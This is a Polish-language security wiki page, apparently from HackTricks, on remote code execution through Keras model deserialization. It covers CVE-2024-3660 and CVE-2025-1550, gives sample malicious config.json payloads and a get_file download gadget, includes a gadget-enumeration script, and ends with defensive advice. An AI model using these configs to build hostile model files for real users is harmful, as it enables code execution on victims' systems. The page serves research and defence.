# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki eksploatacji przeciwko potokowi deserializacji modelu Keras, wyjaśnia wewnętrzne działanie formatu .keras oraz powierzchnię ataku, a także dostarcza narzędzi badawczych do znajdowania Wrażliwości Plików Modelu (MFV) i gadżetów po naprawie.

## Wewnętrzne działanie formatu modelu .keras

Plik .keras to archiwum ZIP zawierające przynajmniej:
- metadata.json – ogólne informacje (np. wersja Keras)
- config.json – architektura modelu (główna powierzchnia ataku)
- model.weights.h5 – wagi w HDF5

Plik config.json napędza rekurencyjną deserializację: Keras importuje moduły, rozwiązuje klasy/funkcje i rekonstruuje warstwy/obiekty z kontrolowanych przez atakującego słowników.

Przykładowy fragment dla obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacja wykonuje:
- Import modułów i rozwiązywanie symboli z kluczy module/class_name
- wywołanie from_config(...) lub konstruktora z kontrolowanymi przez atakującego kwargs
- Rekursję w zagnieżdżonych obiektach (aktywacje, inicjalizatory, ograniczenia itp.)

Historycznie, to ujawniało trzy prymitywy atakującemu tworzącemu config.json:
- Kontrola nad tym, jakie moduły są importowane
- Kontrola nad tym, które klasy/funkcje są rozwiązywane
- Kontrola nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – RCE z bajtkodem warstwy Lambda

Przyczyna:
- Lambda.from_config() używało python_utils.func_load(...), które dekoduje base64 i wywołuje marshal.loads() na bajtach atakującego; deserializacja w Pythonie może wykonać kod.

Pomysł na exploit (uproszczony ładunek w config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigacja:
- Keras domyślnie wymusza safe_mode=True. Zserializowane funkcje Pythona w Lambda są zablokowane, chyba że użytkownik wyraźnie zdecyduje się na safe_mode=False.

Uwagi:
- Starsze formaty (starsze zapisy HDF5) lub starsze bazy kodu mogą nie wymuszać nowoczesnych kontroli, więc ataki w stylu „downgrade” mogą nadal mieć zastosowanie, gdy ofiary używają starszych loaderów.

## CVE-2025-1550 – Dowolny import modułu w Keras ≤ 3.8

Przyczyna:
- _retrieve_class_or_fn używał nieograniczonego importlib.import_module() z ciągami modułów kontrolowanymi przez atakującego z config.json.
- Wpływ: Dowolny import dowolnego zainstalowanego modułu (lub modułu umieszczonego przez atakującego na sys.path). Kod uruchamia się w czasie importu, a następnie następuje konstrukcja obiektu z kwargs atakującego.

Pomysł na exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Poprawki bezpieczeństwa (Keras ≥ 3.9):
- Lista dozwolonych modułów: importy ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny tryb bezpieczny: safe_mode=True blokuje ładowanie niebezpiecznych funkcji zserializowanych Lambda
- Podstawowe sprawdzanie typów: zdeserializowane obiekty muszą odpowiadać oczekiwanym typom

## Powierzchnia gadżetów po poprawce wewnątrz listy dozwolonych

Nawet z listą dozwolonych i trybem bezpiecznym, pozostaje szeroka powierzchnia wśród dozwolonych wywołań Keras. Na przykład, keras.utils.get_file może pobierać dowolne adresy URL do lokalizacji wybranych przez użytkownika.

Gadżet przez Lambda, który odnosi się do dozwolonej funkcji (nie zserializowany bajtkod Pythona):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() dodaje tensor wejściowy jako pierwszy argument pozycyjny podczas wywoływania docelowego wywołania. Wybrane gadżety muszą tolerować dodatkowy argument pozycyjny (lub akceptować *args/**kwargs). Ogranicza to, które funkcje są wykonalne.

Potential impacts of allowlisted gadgets:
- Dowolne pobieranie/zapisywanie (sadzenie ścieżek, zanieczyszczanie konfiguracji)
- Wywołania sieciowe/efekty podobne do SSRF w zależności od środowiska
- Łączenie do wykonania kodu, jeśli zapisane ścieżki są później importowane/wykonywane lub dodawane do PYTHONPATH, lub jeśli istnieje zapisywalna lokalizacja do wykonania przy zapisie

## Researcher toolkit

1) Systematyczne odkrywanie gadżetów w dozwolonych modułach

Enumeruj kandydatów na wywołania w keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym z efektami ubocznymi związanymi z plikami/siecią/procesem/środowiskiem.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Bezpośrednie testowanie deserializacji (nie jest potrzebny archiwum .keras)

Wprowadź przygotowane słowniki bezpośrednio do deserializatorów Keras, aby poznać akceptowane parametry i obserwować efekty uboczne.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probing między wersjami i formaty

Keras istnieje w wielu bazach kodu/epokach z różnymi zabezpieczeniami i formatami:
- Wbudowany Keras w TensorFlow: tensorflow/python/keras (legacy, planowane do usunięcia)
- tf-keras: utrzymywany osobno
- Multi-backend Keras 3 (oficjalny): wprowadzono natywny .keras

Powtarzaj testy w różnych bazach kodu i formatach (.keras vs legacy HDF5), aby odkryć regresje lub brakujące zabezpieczenia.

## Rekomendacje defensywne

- Traktuj pliki modeli jako niezaufane dane wejściowe. Ładuj modele tylko z zaufanych źródeł.
- Utrzymuj Keras w najnowszej wersji; używaj Keras ≥ 3.9, aby skorzystać z list dozwolonych i sprawdzania typów.
- Nie ustawiaj safe_mode=False podczas ładowania modeli, chyba że w pełni ufasz plikowi.
- Rozważ uruchomienie deserializacji w piaskownicy, w środowisku o minimalnych uprawnieniach, bez dostępu do sieci i z ograniczonym dostępem do systemu plików.
- Wprowadź listy dozwolone/podpisy dla źródeł modeli i sprawdzania integralności, gdzie to możliwe.

## Odniesienia

- [Hunting Vulnerabilities in Keras Model Deserialization (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Dodano kontrole do serializacji](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras dowolny import modułu (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [raport huntr – dowolny import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [raport huntr – dowolny import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
